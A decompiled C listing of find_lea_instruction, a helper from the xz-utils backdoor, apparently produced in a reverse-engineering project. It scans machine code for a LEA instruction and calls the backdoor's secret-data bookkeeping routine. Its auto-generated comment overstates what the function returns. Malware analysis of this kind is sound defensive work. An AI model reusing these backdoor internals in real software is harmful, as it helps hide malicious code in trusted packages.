// /home/kali/xzre-ghidra/xzregh/100EB0_find_lea_instruction.c
// Function: find_lea_instruction @ 0x100EB0
// Calling convention: __stdcall
// Prototype: BOOL __stdcall find_lea_instruction(u8 * code_start, u8 * code_end, u64 displacement)


/*
 * AutoDoc: Finds the next LEA instruction in the stream and returns operand details. The backdoor uses this to recover base-plus-offset calculations that point at data structures it later siphons.
 */
#include "xzre_types.h"


BOOL find_lea_instruction(u8 *code_start,u8 *code_end,u64 displacement)

{
  BOOL BVar1;
  long lVar2;
  undefined4 *puVar3;
  byte bVar4;
  dasm_ctx_t dctx;
  undefined4 local_80 [10];
  int local_58;
  u64 local_50;
  
  bVar4 = 0;
  BVar1 = secret_data_append_from_call_site((secret_data_shift_cursor_t)0x7c,5,6,FALSE);
  if (BVar1 != FALSE) {
    puVar3 = local_80;
    for (lVar2 = 0x16; lVar2 != 0; lVar2 = lVar2 + -1) {
      *puVar3 = 0;
      puVar3 = puVar3 + (ulong)bVar4 * -2 + 1;
    }
    for (; code_start < code_end; code_start = code_start + 1) {
      BVar1 = x86_dasm((dasm_ctx_t *)local_80,code_start,code_end);
      if ((((BVar1 != FALSE) && (local_58 == 0x10d)) && ((local_80[4]._1_1_ & 7) == 1)) &&
         ((local_50 == displacement || (local_50 == -displacement)))) {
        return TRUE;
      }
    }
  }
  return FALSE;
}

